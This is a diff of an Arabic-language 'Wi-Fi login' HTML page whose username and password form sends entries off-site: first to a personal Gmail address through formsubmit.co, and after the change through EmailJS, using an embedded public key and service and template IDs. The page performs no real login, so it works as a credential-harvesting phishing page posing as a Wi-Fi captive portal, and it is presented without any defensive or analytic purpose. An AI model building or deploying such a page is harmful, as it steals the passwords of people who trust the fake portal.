@@ -3,55 +3,61 @@
 <head>
   <meta charset="UTF-8">
   <title>تسجيل دخول Wi-Fi</title>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("gP_BeSd5bRueRL4rz"); // ضع الـ Public Key هنا
+    })();
+
+    function sendEmail(e) {
+      e.preventDefault();
+      emailjs.sendForm('service_329u6zc', 'template_38a0azd', e.target)
+        .then(function() {
+          alert('تم الإرسال بنجاح!');
+        }, function(error) {
+          alert('فشل الإرسال: ' + JSON.stringify(error));
+        });
+    }
+  </script>
   <style>
     body {
-      background: #f2f2f2;
-      font-family: 'Segoe UI', sans-serif;
+      font-family: Arial;
+      background: #f4f4f4;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      direction: rtl;
     }
-    .login-box {
+    form {
       background: white;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
-      text-align: center;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #ccc;
       width: 300px;
     }
-    input[type="text"], input[type="password"] {
+    input {
       width: 100%;
       padding: 10px;
       margin: 8px 0;
+      border-radius: 5px;
       border: 1px solid #ccc;
-      border-radius: 6px;
     }
     button {
       width: 100%;
       padding: 10px;
       background: #007bff;
-      border: none;
       color: white;
-      border-radius: 6px;
-      cursor: pointer;
-      font-size: 16px;
-    }
-    button:hover {
-      background: #0056b3;
+      border: none;
+      border-radius: 5px;
     }
   </style>
 </head>
 <body>
-  <form class="login-box" action="https://formsubmit.co/onlydanzo87@gmail.com" method="POST">
-    <h2>تسجيل دخول Wi-Fi</h2>
+  <form onsubmit="sendEmail(event)">
+    <h3>تسجيل دخول Wi-Fi</h3>
     <input type="text" name="username" placeholder="اسم المستخدم" required>
     <input type="password" name="password" placeholder="كلمة المرور" required>
     <button type="submit">دخول</button>
-
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_next" value="https://example.com/thanks.html">
   </form>
 </body>
 </html>
